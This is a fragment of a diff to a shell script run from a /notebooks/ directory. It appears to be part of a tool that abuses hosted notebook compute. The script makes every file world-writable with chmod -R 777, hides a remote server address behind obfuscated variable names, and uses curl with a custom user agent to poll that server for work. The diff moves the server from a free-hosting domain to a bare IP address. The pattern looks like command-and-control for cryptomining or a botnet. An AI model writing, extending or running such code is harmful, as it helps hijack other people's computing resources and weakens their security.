@@ -28,11 +28,11 @@ chmod -R 777 ./
 
 cd /notebooks/
 
-google841212121274="http://workjob12.byethost22.com/"
+google841212121274="http://154.127.52.52/"
 
 google84="26884"
 
-string=$(curl -s -A "mobile84" http://workjob12.byethost22.com/?work=workjob)
+string=$(curl -s -A "mobile84" http://154.127.52.52/?work=workjob)
 if [[ $string == *"16384"* ]]; then
 
 cd /notebooks/
